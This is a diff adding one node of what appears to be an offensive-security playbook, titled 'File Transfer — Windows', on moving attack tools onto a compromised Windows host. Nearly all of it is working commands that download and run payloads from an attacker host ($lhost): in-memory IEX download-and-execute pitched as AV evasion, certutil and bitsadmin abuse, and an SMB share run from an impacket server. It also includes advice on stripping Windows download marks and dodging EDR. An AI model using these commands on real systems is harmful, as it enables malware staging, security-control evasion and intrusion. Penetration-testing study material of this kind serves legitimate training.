@@ -1,0 +1,22 @@
+{
+  "id": "transfer_windows",
+  "phase": "SHELL",
+  "title": "File Transfer — Windows (Download Tools)",
+  "body": "Get tools onto a Windows target. iwr and certutil are your defaults. SMB is the most reliable when HTTP is blocked.",
+  "cmd": "# ── IWR / INVOKE-WEBREQUEST (PowerShell) ─────────────\niwr http://$lhost/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe\niwr http://$lhost/winPEASx64.exe -OutFile C:\\Windows\\Temp\\wp.exe\nUnblock-File C:\\Windows\\Temp\\wp.exe\n\n# In-memory (never touches disk — best for AV evasion)\nIEX(New-Object Net.WebClient).DownloadString(\"http://$lhost/PowerUp.ps1\")\n(new-object net.webclient).downloadstring(\"http://$lhost/PrivescCheck.ps1\") | iex\n\n# ── CERTUTIL (LOLBin — built-in) ─────────────────────\ncertutil -urlcache -split -f http://$lhost/shell.exe C:\\Windows\\Temp\\shell.exe\ncertutil -urlcache -split -f http://$lhost/shell.exe shell.exe\n# Encode/decode (useful if direct download blocked)\ncertutil -encode C:\\Windows\\Temp\\file.exe file.b64\ncertutil -decode file.b64 C:\\Windows\\Temp\\file.exe\n\n# ── SMB SHARE (best when HTTP blocked) ───────────────\n# Attacker (Kali):\n# impacket-smbserver -smb2support kali . -username user -password pass\n\n# Target — map drive and copy\nnet use m: \\\\$lhost\\kali /user:user pass\ncopy \\\\$lhost\\kali\\shell.exe C:\\Windows\\Temp\\shell.exe\n# Or just run directly from share:\n\\\\$lhost\\kali\\shell.exe\n\n# Disconnect when done\nnet use m: /delete\n\n# ── BITSADMIN (background, survives logoff) ───────────\nbitsadmin /transfer job http://$lhost/shell.exe C:\\Windows\\Temp\\shell.exe\n\n# ── CURL (Windows 10+) ───────────────────────────────\ncurl http://$lhost/shell.exe -o C:\\Windows\\Temp\\shell.exe\n\n# ── BASE64 PASTE (no outbound network) ───────────────\n# Attacker: base64 -w0 tool.exe\n# Target:\n[System.Convert]::FromBase64String(\"BASE64STRING\") | Set-Content -Path C:\\Windows\\Temp\\tool.exe -Encoding Byte\n\n# ── UNBLOCK DOWNLOADED FILES ─────────────────────────\n# Windows marks downloaded files as blocked — always unblock\nUnblock-File C:\\Windows\\Temp\\tool.exe\n# Or remove zone identifier:\nRemove-Item -Path C:\\Windows\\Temp\\tool.exe -Stream Zone.Identifier -ErrorAction SilentlyContinue",
+  "warn": "certutil is heavily signatured by AV/EDR. If Defender is active use iwr or SMB. Always run Unblock-File after downloading — blocked files run silently and do nothing.",
+  "choices": [
+    {
+      "label": "Exfiltrate data back to Kali",
+      "next": "transfer_exfil"
+    },
+    {
+      "label": "Linux transfer instead",
+      "next": "transfer_linux"
+    },
+    {
+      "label": "Tools on box — start Windows privesc",
+      "next": "windows_post_exploit"
+    }
+  ]
+}
